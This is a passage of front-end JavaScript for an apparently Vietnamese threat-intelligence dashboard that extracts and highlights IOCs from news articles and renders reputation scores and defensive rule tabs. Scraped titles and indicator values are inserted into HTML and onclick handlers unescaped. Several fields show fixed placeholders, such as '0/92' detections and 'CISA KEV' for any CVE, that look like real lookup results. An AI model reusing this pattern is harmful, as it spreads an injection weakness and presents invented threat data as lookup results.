          const clean = cleanRefang(rawIp);
          const isSafe = isBenignOrProtectedIoc(rawIp);
          if (!iocProvenanceMap[clean]) {
            iocProvenanceMap[clean] = {
              articleIdx: idx,
              source: art.source,
              title: art.title,
              url: art.url,
              proofUrl: buildTextFragmentUrl(art.url, rawIp),
              rawToken: rawIp,
              role: isSafe ? 'IP2 • An toàn' : 'IP1 • Tấn công / C2'
            };
          }
        });

        const rawDoms = art.content.match(domRegex) || [];
        rawDoms.forEach(rawDom => {
          const clean = cleanRefang(rawDom).toLowerCase();
          const isSafe = isBenignOrProtectedIoc(rawDom);
          if (!iocProvenanceMap[clean]) {
            iocProvenanceMap[clean] = {
              articleIdx: idx,
              source: art.source,
              title: art.title,
              url: art.url,
              proofUrl: buildTextFragmentUrl(art.url, rawDom),
              rawToken: rawDom,
              role: isSafe ? 'Tên miền Hợp pháp' : 'Tên miền C2'
            };
          }
        });

        const rawCves = art.content.match(cveRegex) || [];
        rawCves.forEach(rawCve => {
          const clean = rawCve.toUpperCase();
          if (!iocProvenanceMap[clean]) {
            iocProvenanceMap[clean] = {
              articleIdx: idx,
              source: art.source,
              title: art.title,
              url: art.url,
              proofUrl: buildTextFragmentUrl(art.url, rawCve),
              rawToken: rawCve,
              role: 'Lỗ hổng CVE'
            };
          }
        });

        const rawShas = art.content.match(shaRegex) || [];
        rawShas.forEach(rawSha => {
          const clean = rawSha.toLowerCase();
          if (!iocProvenanceMap[clean]) {
            iocProvenanceMap[clean] = {
              articleIdx: idx,
              source: art.source,
              title: art.title,
              url: art.url,
              proofUrl: buildTextFragmentUrl(art.url, rawSha),
              rawToken: rawSha,
              role: 'Mã băm SHA256'
            };
          }
        });

        const md5Regex = /\b[a-fA-F0-9]{32}\b/g;
        const rawMds = art.content.match(md5Regex) || [];
        rawMds.forEach(rawMd => {
          const clean = rawMd.toLowerCase();
          if (!iocProvenanceMap[clean]) {
            iocProvenanceMap[clean] = {
              articleIdx: idx,
              source: art.source,
              title: art.title,
              url: art.url,
              proofUrl: buildTextFragmentUrl(art.url, rawMd),
              rawToken: rawMd,
              role: 'Mã băm MD5'
            };
          }
        });

        const paragraphs = art.content.split(/\n+/).filter(p => p.trim().length > 0);
        const renderedParas = paragraphs.map(p => {
          let hasValidIp = false;
          let pIpMatch;
          ipRegex.lastIndex = 0;
          while ((pIpMatch = ipRegex.exec(p)) !== null) {
            if (isValidIpv4Token(pIpMatch[0], p, pIpMatch.index)) {
              hasValidIp = true;
              break;
            }
          }
          const hasIoc =
            hasValidIp ||
            domRegex.test(p) ||
            cveRegex.test(p) ||
            shaRegex.test(p) ||
            md5Regex.test(p);
          domRegex.lastIndex = 0;
          cveRegex.lastIndex = 0;
          shaRegex.lastIndex = 0;
          md5Regex.lastIndex = 0;

          let safeP = p.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

          safeP = safeP.replace(cveRegex, (m) => `<span class="HlCve" id="${domSafeId(m.toUpperCase())}">${m}</span>`);
          safeP = safeP.replace(shaRegex, (m) => `<span class="HlHash" id="${domSafeId(m.toLowerCase())}">${m}</span>`);
          safeP = safeP.replace(md5Regex, (m) => `<span class="HlHash" id="${domSafeId(m.toLowerCase())}">${m}</span>`);
          safeP = safeP.replace(domRegex, (m) => {
            const clean = cleanRefang(m).toLowerCase();
            if (ipRegex.test(clean)) { ipRegex.lastIndex = 0; return m; }
            ipRegex.lastIndex = 0;
            return `<span class="${isBenignOrProtectedIoc(m) ? 'HlIp2' : 'HlIp1'}" id="${domSafeId(clean)}">${m}</span>`;
          });
          safeP = safeP.replace(ipRegex, (m, offset, fullStr) => {
            if (!isValidIpv4Token(m, fullStr, offset)) return m;
            return `<span class="${isBenignOrProtectedIoc(m) ? 'HlIp2' : 'HlIp1'}" id="${domSafeId(cleanRefang(m))}">${m}</span>`;
          });

          return hasIoc ? `<div class="HlSentence">${safeP}</div>` : `<div style="margin:6px 0; color:var(--text-muted);">${safeP}</div>`;
        }).join('');

        const st = art.status || 'pending';
        let statusBadgeHtml = '';
        if (st === 'processing') {
          statusBadgeHtml = `<span class="BadgeProcessing">Đang xử lý...</span>`;
        } else if (st === 'completed') {
          const dur = art.processing_time_sec ? `${art.processing_time_sec.toFixed(1)}s` : 'Xong';
          statusBadgeHtml = `<span class="BadgeCompleted">Đã xử lý (${dur})</span>`;
        } else {
          statusBadgeHtml = `<span class="BadgePending">Chờ xử lý</span>`;
        }
        const pubTime = formatToLocalTime(art.sort_ts || art.published_at);
        const displayTime = formatToLocalTime(art.fetched_at || art.sort_ts);

        return `
          <div style="margin-bottom:16px; padding-bottom:12px; border-bottom:1px solid var(--border-main);" id="art-evidence-${idx}">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px; gap:8px;">
              <b style="color:var(--text-main); font-size:13.5px;">#${idx + 1} [${art.source}] ${art.title}</b>
              <a class="BtnMiniProof" href="${art.url}" target="_blank">Báo gốc &nearr;</a>
            </div>
            <div style="display:flex; align-items:center; gap:12px; margin-bottom:10px; font-size:11.5px; color:var(--text-muted); flex-wrap:wrap;">
              <span>Xuất bản: <b style="color:var(--text-main); font-family:var(--font-mono);">${pubTime}</b></span>
              <span>Quét về: <b style="color:var(--primary); font-family:var(--font-mono);">${displayTime}</b></span>
              <span>Trạng thái: ${statusBadgeHtml}</span>
              ${art.processing_time_sec ? `<span>Thời gian AI xử lý: <b style="color:var(--primary); font-family:var(--font-mono);">${art.processing_time_sec.toFixed(1)}s</b></span>` : ''}
            </div>
            <div>${renderedParas}</div>
          </div>
        `;
      });

      document.getElementById('highlightedArticleView').innerHTML = htmlBlocks.join('');
    }

    function findArticleByIoc(iocVal) {
      if (!iocVal) return null;
      const clean = cleanRefang(iocVal).trim();
      const cleanLower = clean.toLowerCase();
      const list = (allHistoryArticles && allHistoryArticles.length > 0) ? allHistoryArticles : articles;

      // 1. Kiểm tra provenance map nếu bài đang mở
      if (iocProvenanceMap && (iocProvenanceMap[clean] || iocProvenanceMap[cleanLower])) {
        const prov = iocProvenanceMap[clean] || iocProvenanceMap[cleanLower];
        const match = list.find(a => a.url === prov.url || a.title === prov.title);
        if (match) return match;
      }

      // 2. So khớp nhanh theo mẫu IOC trong ioc_counts
      for (const art of list) {
        const c = art.ioc_counts || {};
        if (
          (c.sample_ips || []).some(ip => ip === clean) ||
          (c.sample_shas || []).some(sh => sh.toLowerCase() === cleanLower || (cleanLower.length >= 16 && sh.toLowerCase().includes(cleanLower.slice(0, 16)))) ||
          (c.sample_cves || []).some(cv => cv.toUpperCase() === clean.toUpperCase()) ||
          (c.sample_domains || []).some(dm => dm.toLowerCase() === cleanLower)
        ) {
          return art;
        }
      }

      // 3. Quét toàn văn nội dung bài báo
      const escapedClean = clean.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      const dotPattern = clean.includes('.') ? clean.split('.').map(p => p.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')).join('(?:\\.|(?:\\[\\.\\])|(?:\\(\\.\\)))') : escapedClean;
      try {
        const reg = new RegExp(dotPattern, 'i');
        for (const art of list) {
          if (reg.test(art.content || '') || reg.test(art.title || '')) {
            return art;
          }
        }
      } catch (e) {}

      // 4. Nếu là Hash dài, thử tìm tiền tố 16-24 ký tự
      if (clean.length >= 16) {
        const prefix = clean.slice(0, 16).toLowerCase();
        for (const art of list) {
          if ((art.content || '').toLowerCase().includes(prefix) || (art.title || '').toLowerCase().includes(prefix)) {
            return art;
          }
        }
      }

      return null;
    }

    async function navigateToArticleByIoc(iocVal) {
      if (!iocVal) return;
      const clean = cleanRefang(iocVal).trim();

      updateLiveTicker("Đang tra cứu bài báo gốc chứa chỉ số: " + clean + "...");
      let foundArt = findArticleByIoc(clean);

      if (!foundArt) {
        try {
          const res = await fetch(`/api/articles/find-by-ioc?ioc=${encodeURIComponent(clean)}`);
          if (res.ok) {
            const data = await res.json();
            if (data && data.article) {
              foundArt = data.article;
            }
          }
        } catch (e) {
          console.warn("Lỗi tra cứu find-by-ioc API:", e);
        }
      }

      if (!foundArt) {
        alert("Chỉ số " + clean + " nằm trong cơ sở dữ liệu đối soát an ninh chung.");
        return;
      }

      // Đưa giao diện về chế độ hiển thị bài báo (Section 1)
      switchView('all', document.querySelector('.NavLinks .NavLink'));

      // Mở bài báo đó ở Section 1
      viewArticleById(foundArt.article_id, false);

      updateLiveTicker("Đã chuyển tới bài báo [" + foundArt.source + "] \"" + foundArt.title.slice(0, 48) + "...\" chứa chỉ số " + clean);

      // Chờ bài báo render và cuộn thẳng tới chỉ số đó
      setTimeout(() => {
        jumpToArticleHighlight(clean);
      }, 280);
    }

    function jumpToArticleHighlight(iocValue) {
      const clean = cleanRefang(iocValue);
      const safeId = domSafeId(clean);
      let el = document.getElementById(safeId) || document.getElementById(domSafeId(clean.toLowerCase()));

      const viewer = document.getElementById('highlightedArticleView');
      const viewerBox = document.getElementById('highlightViewerBox');

      // Nếu chưa tìm thấy ID chính xác, quét các element con trong văn bản
      if (!el && viewer) {
        const candidates = viewer.querySelectorAll('.HlSentence, .HlIp1, .HlIp2, .HlCve, .HlHash, span, div');
        const cleanLower = clean.toLowerCase();
        const shortClean = clean.length > 20 ? clean.slice(0, 16).toLowerCase() : cleanLower;
        for (const node of candidates) {
          const txt = (node.textContent || '').toLowerCase();
          if (txt.includes(cleanLower) || (shortClean && txt.includes(shortClean))) {
            el = node;
            break;
          }
        }
      }

      if (viewerBox) {
        viewerBox.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }

      if (el) {
        setTimeout(() => {
          el.scrollIntoView({ behavior: 'smooth', block: 'center' });
          el.classList.remove('flash-focus');
          void el.offsetWidth;
          el.classList.add('flash-focus');
        }, 180);
      }
    }

    let isQueueWorkerRunning = false;
    let autoQueueEnabled = false;

    async function toggleAutoQueueWorker() {
      const toggleEl = document.getElementById('autoQueueToggle');
      const val = toggleEl ? toggleEl.checked : false;
      await onAutoQueueToggleChange(val);
      const btn = document.getElementById('btnQueueControl');
      if (btn) btn.textContent = val ? "Dừng Hàng Đợi" : "Tiếp Tục Hàng Đợi";
    }

    async function toggleAutoQueueManual() {
      const toggleEl = document.getElementById('autoQueueToggle');
      if (toggleEl) {
        toggleEl.checked = !toggleEl.checked;
        await toggleAutoQueueWorker();
      }
    }

    let currentScoreTableList = [];
    let currentIocTypeFilter = 'ALL';

    function filterScoreTableByType(type, btnEl) {
      currentIocTypeFilter = type;
      document.querySelectorAll('.IocTypeFilterBtn').forEach(b => b.classList.remove('active'));
      if (btnEl) btnEl.classList.add('active');
      renderFilteredScoreTable();
    }

    function renderScoreTable(enrichedList) {
      if (enrichedList && Array.isArray(enrichedList)) {
        currentScoreTableList = enrichedList;
      }
      // Cập nhật số đếm trên các nút bộ lọc
      const allCount = currentScoreTableList.length;
      let hashCount = 0, ipCount = 0, domCount = 0, cveCount = 0;
      currentScoreTableList.forEach(item => {
        const t = (item.ioc && item.ioc.ioc_type) || '';
        if (t === 'SHA256' || t === 'MD5') hashCount++;
        else if (t === 'IP') ipCount++;
        else if (t === 'DOMAIN') domCount++;
        else if (t === 'CVE') cveCount++;
      });
      const elAll = document.getElementById('countIocAll');
      const elHash = document.getElementById('countIocHash');
      const elIp = document.getElementById('countIocIp');
      const elDom = document.getElementById('countIocDomain');
      const elCve = document.getElementById('countIocCve');
      if (elAll) elAll.textContent = allCount;
      if (elHash) elHash.textContent = hashCount;
      if (elIp) elIp.textContent = ipCount;
      if (elDom) elDom.textContent = domCount;
      if (elCve) elCve.textContent = cveCount;

      renderFilteredScoreTable();
    }

    function renderFilteredScoreTable() {
      const tbody = document.getElementById('scoreTableBody');
      if (!tbody) return;
      let list = currentScoreTableList || [];
      if (currentIocTypeFilter === 'HASH') {
        list = list.filter(item => item.ioc && (item.ioc.ioc_type === 'SHA256' || item.ioc.ioc_type === 'MD5'));
      } else if (currentIocTypeFilter === 'IP') {
        list = list.filter(item => item.ioc && item.ioc.ioc_type === 'IP');
      } else if (currentIocTypeFilter === 'DOMAIN') {
        list = list.filter(item => item.ioc && item.ioc.ioc_type === 'DOMAIN');
      } else if (currentIocTypeFilter === 'CVE') {
        list = list.filter(item => item.ioc && item.ioc.ioc_type === 'CVE');
      }

      if (list.length === 0) {
        tbody.innerHTML = `<tr><td colspan="9" style="text-align:center; padding:18px; color:var(--text-muted);">Không có chỉ số nào thuộc phân loại này trong ngữ cảnh hiện tại.</td></tr>`;
        return;
      }

      tbody.innerHTML = list.map(item => {
        const otx = (item.raw_lookup_details && item.raw_lookup_details.alienvault_otx) || {};
        const vt = (item.raw_lookup_details && item.raw_lookup_details.virustotal) || {};
        const ab = (item.raw_lookup_details && item.raw_lookup_details.abuseipdb) || {};
        const sh = (item.raw_lookup_details && item.raw_lookup_details.shodan_internetdb) || {};
        const gn = (item.raw_lookup_details && item.raw_lookup_details.greynoise) || {};
        const isHash = item.ioc.ioc_type === 'SHA256' || item.ioc.ioc_type === 'MD5';
        const cleanVal = (item.ioc && item.ioc.value) || '';
        const prov = (typeof iocProvenanceMap !== 'undefined' && iocProvenanceMap && (iocProvenanceMap[cleanVal] || iocProvenanceMap[cleanVal.toLowerCase()])) || {};
        const roleLabel = prov.role || (
          isHash
            ? (item.is_malicious ? 'Mã độc • File Payload' : 'Tập tin An toàn')
            : (item.is_malicious ? 'IP1 • Nguồn tấn công' : 'IP2 • An toàn')
        );
        const proofUrl = prov.proofUrl || prov.url || '';

        const otxPulses = otx.pulse_count || 0;
        const otxCountry = (otx.country && otx.country !== 'UNKNOWN') ? ` (${otx.country})` : '';
        const otxDisplay = isHash
          ? (otxPulses > 0 ? `<span style="color:var(--amber); font-weight:600;">${otxPulses} Pulses</span>` : 'Malware Sample')
          : (otxPulses > 0
            ? `<span style="color:var(--amber); font-weight:600;">${otxPulses} Pulses</span>${otxCountry}`
            : (item.ioc.ioc_type === 'CVE' ? 'CISA KEV' : `0 Pulses${otxCountry}`));

        const abScore = ab.abuse_confidence_score ?? 0;
        const gnTag = gn.riot ? ' • RIOT' : (gn.noise ? ' • Noise' : '');
        const malFamily = (item.raw_lookup_details && item.raw_lookup_details.malware_family) || (isHash ? 'Payload Mã Độc' : '-');
        const abuseGnDisplay = item.ioc.ioc_type === 'IP' ? `${abScore}%${gnTag}` : (isHash ? malFamily : '-');

        const shPorts = (sh.ports || []).slice(0, 3).join(', ');
        const shVulns = (sh.vulns || []).length;
        const shDisplay = isHash
          ? 'Quét YARA/EDR'
          : (shPorts
            ? `${shPorts}${shVulns > 0 ? ` (${shVulns} CVE)` : ''}`
            : (shVulns > 0 ? `${shVulns} CVE` : '-'));

        const iocDisplay = isHash
          ? `<div style="display:flex; flex-direction:column; gap:3px;">
               <div style="display:flex; align-items:center; gap:6px; flex-wrap:wrap;">
                 <span class="IocChip hash" style="font-size:10px;">${item.ioc.ioc_type}</span>
                 <span class="mono" style="font-size:11.5px; word-break:break-all; font-weight:600;" title="${item.ioc.value}">
                   ${item.ioc.value.length > 28 ? item.ioc.value.slice(0, 14) + '...' + item.ioc.value.slice(-10) : item.ioc.value}
                 </span>
               </div>
               <div>
                 <button class="BtnIocJump" onclick="navigateToArticleByIoc('${cleanVal}')" title="Nhấn để mở và cuộn tới bài báo chứa mã băm này">
                   Đến bài báo &darr;
                 </button>
               </div>
             </div>`
          : `<div style="display:flex; flex-direction:column; gap:3px;">
               <div style="display:flex; align-items:center; gap:6px; flex-wrap:wrap;">
                 <span class="IocChip ${item.ioc.ioc_type === 'IP' ? 'ip' : (item.ioc.ioc_type === 'CVE' ? 'cve' : 'dom')}" style="font-size:10px;">${item.ioc.ioc_type}</span>
                 <span class="mono" style="font-weight:600; font-size:12px;">${item.ioc.value}</span>
               </div>
               <div>
                 <button class="BtnIocJump" onclick="navigateToArticleByIoc('${cleanVal}')" title="Nhấn để mở và cuộn tới bài báo chứa chỉ số ${item.ioc.value}">
                   Đến bài báo &darr;
                 </button>
               </div>
             </div>`;

        return `
          <tr>
            <td>${iocDisplay}</td>
            <td style="color:${item.is_malicious ? 'var(--danger)' : 'var(--safe)'};">${roleLabel}</td>
            <td class="mono">${otxDisplay}</td>
            <td class="mono">${vt.detection_ratio || '0/92'}</td>
            <td class="mono">${abuseGnDisplay}</td>
            <td class="mono">${shDisplay}</td>
            <td class="mono" style="font-weight:600; color:var(--safe);">${item.reputation_score}/100</td>
            <td>
              ${item.is_malicious
                ? '<span class="StatusBlock">CHẶN (&gt;80)</span>'
                : '<span class="StatusSafe">AN TOÀN (&le;80)</span>'}
            </td>
            <td>
              <div style="display:flex; gap:6px; flex-wrap:wrap;">
                <button class="BtnMiniProof" style="font-weight:600;" onclick="navigateToArticleByIoc('${cleanVal}')" title="Xem câu văn và ngữ cảnh bài báo chứa chỉ số này">Xem câu</button>
                ${proofUrl ? `<a class="BtnMiniProof" href="${proofUrl}" target="_blank" title="Mở trang báo điện tử quốc tế gốc">Web gốc &nearr;</a>` : ''}
              </div>
            </td>
          </tr>
        `;
      }).join('');
    }

    function selectBatch(count = 4, autoRun = false) {
      const slice = articles.slice(0, Math.min(count, articles.length));
      if (slice.length === 0) return;
      selectedIndices = slice.map((_, idx) => idx);
      document.querySelectorAll('.FeedItem').forEach(c => c.classList.remove('selected'));
      selectedIndices.forEach(idx => {
        const el = document.getElementById(`ncard-${idx}`);
        if (el) el.classList.add('selected');
      });

      currentTitle = `[Gộp ${slice.length} Bài Báo] ` + slice.map(a => a.source).join(', ');
      document.getElementById('articleText').value = slice.map((a, i) =>
        `=== [BÀI BÁO #${i + 1} - ${a.source}]: ${a.title} ===\n${a.content}`
      ).join('\n\n');

      renderHighlightedArticlesAndBuildProvenance(slice.map((art, idx) => ({ art, idx })));
      if (autoRun) runPipeline();
    }

    let masterDefenseCache = null;
    let masterDefenseScopeCache = {};
    let currentDefenseViewMode = 'MASTER';
    let currentDefenseMode = 'MASTER';

    
    async function recompileActiveProjectSkill() {
      const outEl = document.getElementById('outSkillMd');
      if (outEl) outEl.textContent = 'Đang nạp Gói Kỹ Năng Tác Tử tối ưu riêng cho mã nguồn My_Website...';
      try {
        const res = await fetch('/api/defense/skill/export?scope=SCOPE_WEB');
        const txt = await res.text();
        if (outEl) outEl.textContent = txt;
      } catch (e) {
        if (outEl) outEl.textContent = 'Lỗi nạp Bộ Kỹ Năng: ' + e;
      }
    }

    async function switchDefenseScope(mode) {
      currentDefenseViewMode = mode;
      const btn3Y = document.getElementById('btnScope3YMaster');
      const btnSingle = document.getElementById('btnScopeSingleArticle');
      const badge = document.getElementById('badgeDefenseScopeStatus');

      if (mode === 'MASTER') {
        if (btn3Y) btn3Y.classList.add('btn-primary', 'active');
        if (btnSingle) btnSingle.classList.remove('btn-primary', 'active');
        if (badge) {
          const totalArt = masterDefenseCache ? masterDefenseCache.total_articles : '7,450';
          badge.textContent = `ĐANG HIỂN THỊ: TOÀN BỘ KHO (${totalArt.toLocaleString()} BÀI BÁO)`;
          badge.style.background = 'var(--safe-bg)';
          badge.style.color = 'var(--safe)';
          badge.style.borderColor = 'var(--safe-border)';
        }
        await loadMasterDefenseMatrix(currentSelectedTargetScope || 'SCOPE_ALL');
      } else {
        if (btnSingle) btnSingle.classList.add('btn-primary', 'active');
        if (btn3Y) btn3Y.classList.remove('btn-primary', 'active');
        if (badge) {
          badge.textContent = 'ĐANG HIỂN THỊ: THEO BÀI BÁO ĐANG CHỌN (CHẤM ĐIỂM RIÊNG)';
          badge.style.background = 'var(--primary-subtle)';
          badge.style.color = 'var(--primary)';
          badge.style.borderColor = '#bfdbfe';
        }
        if (selectedIndices.length > 0 && articles[selectedIndices[0]]) {
          const art = articles[selectedIndices[0]];
          await loadAndDisplaySingleArticleDefense(art);
        }
      }
    }

    async function loadAndDisplaySingleArticleDefense(art) {
      if (!art) return;
      const lblDefenseArt = document.getElementById('lblCurrentArticleNameDefense');
      if (lblDefenseArt) {
        lblDefenseArt.textContent = art.title.length > 25 ? art.title.slice(0, 25) + '...' : art.title;
      }
      if (articleDefenseCache[art.article_id]) {
        applyArticleDefenseData(articleDefenseCache[art.article_id]);
        return;
      }
      try {
        const res = await fetch(`/api/articles/details/${art.article_id}`);
        if (res.ok) {
          const data = await res.json();
          articleDefenseCache[art.article_id] = {
            history: data.history_and_summary,
            firewall: data.firewall_tab_text,
            suricata: data.suricata_rules,
            waf: data.waf_rules,
            sigma: data.sigma_and_siem,
            yara: data.yara_remediation_stix,
            skill_md: data.agentic_skill_md,
            trust_audit: data.trust_audit,
            xai_audit: data.xai_audit,
            score: data.all_enriched,
            plan: data.ai_plan,
            reason: data.ai_reasoning
          };
          applyArticleDefenseData(articleDefenseCache[art.article_id]);
        }
      } catch (e) {
        console.warn("Lỗi nạp nhanh chi tiết bài báo:", e);
      }
    }

    function applyMasterDefenseData(d) {
      if (!d) return;
      if (d.agentic_skill_md) document.getElementById('outSkillMd').textContent = d.agentic_skill_md;
      if (d.trust_audit) renderTrustAuditView(d.trust_audit);
      if (d.xai_audit) renderXAIExplanationView(d.xai_audit);
      document.getElementById('outHistory').textContent = d.mitre_d3fend || '';
      document.getElementById('outFirewall').textContent = d.firewall_tab_text || '';
      document.getElementById('outSuricata').textContent = d.suricata_rules || '';
      document.getElementById('outWaf').textContent = d.waf_rules || '';
      document.getElementById('outSigma').textContent = d.sigma_and_siem || '';
      document.getElementById('outYara').textContent = d.yara_remediation_stix || '';
      if (d.all_enriched) renderScoreTable(d.all_enriched);
      const suriBadge = document.getElementById('suriFileInfoBadge');
      if (suriBadge) {
        const lineCount = (d.suricata_rules || '').split('\n').length;
        suriBadge.textContent = `Tệp: cti_autonomous_master.rules (${lineCount} Dòng • 11 Cụm C2 • 180 Domain Sinkhole • CVE Virtual Patching)`;
      }
    }

    async function loadMasterDefenseMatrix(scope = 'SCOPE_ALL', force = false) {
      const btnScope = document.getElementById('btnScopeMaster');
      if (btnScope) {
        btnScope.textContent = 'Đang nạp toàn kho...';
        btnScope.classList.add('active');
      }
      try {
        if (force || !masterDefenseScopeCache[scope]) {
          const res = await fetch(`/api/master-defense-matrix?scope=${scope}`);
          masterDefenseScopeCache[scope] = await res.json();
        }
        const d = masterDefenseScopeCache[scope];
        masterDefenseCache = d;

        // Cập nhật số liệu bài báo và IOC mới nhất lên nút và giao diện
const elArt = document.getElementById('lblMasterArticlesCount');
        if (elArt) elArt.textContent = d.total_articles.toLocaleString();
        const elIoc = document.getElementById('lblMasterIocsCount');
        if (elIoc) elIoc.textContent = d.total_iocs.toLocaleString();
        
        const s1 = document.getElementById('lblCorpusStats1');
        if (s1) s1.innerHTML = `KHO TRI THỨC PHÂN HỆ: ${d.total_articles.toLocaleString()} BÀI BÁO &amp; ${d.total_iocs.toLocaleString()} IOCs (2024 - 2026)`;
        const s2 = document.getElementById('lblCorpusStats2');
        if (s2) s2.innerHTML = `KHO TRI THỨC PHÂN HỆ: ${d.total_articles.toLocaleString()} BÀI BÁO &amp; ${d.total_iocs.toLocaleString()} IOCs`;

        // 1. Cập nhật Banner Ngữ Cảnh
        const banner = document.getElementById('unifiedScopeBanner');
        if (banner) {
          banner.className = 'UnifiedScopeBanner master';
        }
        const tag = document.getElementById('scopeTag');
        if (tag) {
          tag.className = 'ScopeTag master';
          tag.textContent = 'TOÀN BỘ KHO TRI THỨC';
        }
        const titleEl = document.getElementById('scopeTitle');
        if (titleEl) {
          titleEl.textContent = `Ma Trận Phòng Thủ Hợp Nhất Đa Nguồn (${d.total_articles} Bài Báo • ${d.total_iocs} IOCs)`;
        }
        const subEl = document.getElementById('scopeSubtitle');
        if (subEl) {
          subEl.innerHTML = `Tổng hợp 6 nguồn OSINT: <b>${d.malware_hashes}</b> Mã băm Malware (SHA256/MD5), <b>${d.malicious_ips}</b> IP C2, <b>${d.malicious_domains}</b> Tên miền độc, <b>${d.cves_count}</b> Lỗ hổng CVE. Nhấn vào từng bài báo ở Mục 1 để xem phân tích riêng.`;
        }

        // 2. Cập nhật Bảng điểm IOC mục 2
        renderScoreTable(d.all_enriched);
        const reasonBox = document.getElementById('aiReasonBox');
        if (reasonBox) {
          reasonBox.textContent = `[LOCAL OLLAMA (khang-qwen3 • GPU RX 6600 8GB)]\nLocal AI Agent đã tổng hợp tri thức tự động từ toàn bộ ${d.total_articles} bài báo trong kho CTI SQLite. Đã phát hiện ${d.total_iocs} chỉ số nguy hại (${d.malicious_ips} IP C2, ${d.malicious_domains} Tên miền độc, ${d.cves_count} lỗ hổng CVE, ${d.malware_hashes} mã băm Malware SHA256/MD5). Toàn bộ đã được đưa vào ma trận 6 lớp phòng thủ.`;
        }
        const planBox = document.getElementById('aiPlanBox');
        if (planBox) {
          planBox.textContent = `[CHIẾN LƯỢC TOÀN KHO]\n1. Khóa biên mạng: Chặn ${d.malicious_ips} IP máy chủ C2 qua OpenC2.\n2. Bắt gói tin sâu: Suricata IPS DPI bắt ${d.malicious_domains} Domain và ${d.cves_count} CVE.\n3. Vá ảo WAF: ModSecurity bảo vệ máy chủ Web/API.\n4. Rà soát máy trạm: YARA & EDR AppLocker chặn ${d.malware_hashes} mã băm Malware.`;
        }

        // 3. Cập nhật các tab phòng thủ mục 3 nếu đang ở chế độ MASTER
        if (currentDefenseViewMode === 'MASTER') {
          applyMasterDefenseData(d);
        }

        const statusEl = document.getElementById('statusText');
        if (statusEl) {
          statusEl.textContent = `Quy trình phòng thủ 5 bước chuẩn hóa • Sẵn sàng quét mã nguồn.`;
        }
        updateLiveTicker(`Tác tử CTI sẵn sàng • Hệ thống phòng thủ tự hành dựa trên tri thức CTI đa nguồn.`);
      } catch (e) {
        console.error('Lỗi tải Ma Trận Tổng Hợp:', e);
      } finally {
        if (btnScope) {
          btnScope.textContent = 'Xem Toàn Bộ Kho CTI';
          btnScope.classList.add('btn-primary');
        }
      }
    }

    async function selectCard(idx, autoRun = false) {
      const art = articles[idx];
      if (!art) return;
      selectedIndices = [idx];
      document.querySelectorAll('.FeedItem').forEach(c => c.classList.remove('selected'));
      const activeCard = document.getElementById(`ncard-${idx}`);
      if (activeCard) activeCard.classList.add('selected');

      currentTitle = art.title;
      document.getElementById('articleText').value = art.content;
      renderHighlightedArticlesAndBuildProvenance([{ art, idx }]);

      const counts = art.ioc_counts || { ips: 0, domains: 0, cves: 0, sha256: 0, total: 0 };
      const btnScope = document.getElementById('btnScopeMaster');
      if (btnScope) btnScope.classList.remove('active');

      const lblDefenseArt = document.getElementById('lblCurrentArticleNameDefense');
      if (lblDefenseArt) {
        lblDefenseArt.textContent = art.title.length > 25 ? art.title.slice(0, 25) + '...' : art.title;
      }

      // 1. Cập nhật UnifiedScopeBanner cho bài báo đang chọn
      const banner = document.getElementById('unifiedScopeBanner');
      if (banner) banner.className = 'UnifiedScopeBanner';
      const tag = document.getElementById('scopeTag');
      if (tag) {
        tag.className = 'ScopeTag single';
        tag.textContent = `BÀI BÁO #${idx + 1}`;
      }
      const titleEl = document.getElementById('scopeTitle');
      if (titleEl) {
        titleEl.textContent = art.title;
      }
      const subEl = document.getElementById('scopeSubtitle');
      if (subEl) {
        const iocSummaryParts = [];
        if (counts.sha256 > 0) iocSummaryParts.push(`<b>${counts.sha256}</b> Hash`);
        if (counts.ips > 0) iocSummaryParts.push(`<b>${counts.ips}</b> IP`);
        if (counts.domains > 0) iocSummaryParts.push(`<b>${counts.domains}</b> Domain`);
        if (counts.cves > 0) iocSummaryParts.push(`<b>${counts.cves}</b> CVE`);
        const iocSummaryStr = iocSummaryParts.length > 0 ? iocSummaryParts.join(', ') : 'Tin tức chính sách / không có IOC cụ thể';
        subEl.innerHTML = `Nguồn: <b>${art.source}</b> • Chỉ số: ${iocSummaryStr} • Trạng thái: <b>${art.status === 'completed' ? 'Đã hoàn thành' : 'Chờ xử lý'}</b>.`;
      }

      // 2. Tự động áp dụng dữ liệu phòng thủ nếu người dùng đang xem ở chế độ Theo Bài Báo
      if (currentDefenseViewMode === 'SINGLE') {
        await loadAndDisplaySingleArticleDefense(art);
      } else {
        // Tải sẵn vào cache ngầm
        loadAndDisplaySingleArticleDefense(art);
      }

      if (autoRun) executeSingleArticleQueue(idx);
    }

    function applyArticleDefenseData(c) {
      if (c.skill_md) document.getElementById('outSkillMd').textContent = c.skill_md;
      if (c.trust_audit) renderTrustAuditView(c.trust_audit);
      if (c.xai_audit) renderXAIExplanationView(c.xai_audit);
      if (c.history) document.getElementById('outHistory').textContent = c.history;
      if (c.firewall) document.getElementById('outFirewall').textContent = c.firewall;
      if (c.suricata) document.getElementById('outSuricata').textContent = c.suricata;
      if (c.waf) document.getElementById('outWaf').textContent = c.waf;
      if (c.sigma) document.getElementById('outSigma').textContent = c.sigma;
      if (c.yara) document.getElementById('outYara').textContent = c.yara;
      if (c.score) renderScoreTable(c.score);
      if (c.plan) document.getElementById('aiPlanBox').textContent = c.plan;
      if (c.reason) document.getElementById('aiReasonBox').textContent = c.reason;
    }

    // ====================================================================
    // KHUNG ĐỊNH LƯỢNG TIN CẬY TOÁN HỌC & ĐIỀU PHỐI SKILL.md CHO AI AGENT
    // ====================================================================
    let currentSelectedTargetScope = 'SCOPE_ALL';
    const targetScopeDetails = {
      'SCOPE_ALL': {
        name: 'Toàn Diện Đa Tầng (Enterprise SOC)',
        persona: 'SOC Lead / CISO Toàn Doanh Nghiệp',
        cadence: 'Đa tầng động (15m - 24h)',
        desc: 'Phạm vi quét toàn diện cho toàn bộ hạ tầng doanh nghiệp. Tự động liên kết các kỹ thuật từ Lỗ hổng Web, Cụm C2, Máy trạm đến Vi mã Firmware.'
      },
      'SCOPE_WEB': {
        name: 'Phân Hệ A: Ứng Dụng Web & API (OWASP, SQLi, XSS, RCE)',
        persona: 'Chuyên gia Bảo mật Web (DevSecOps / AppSec)',
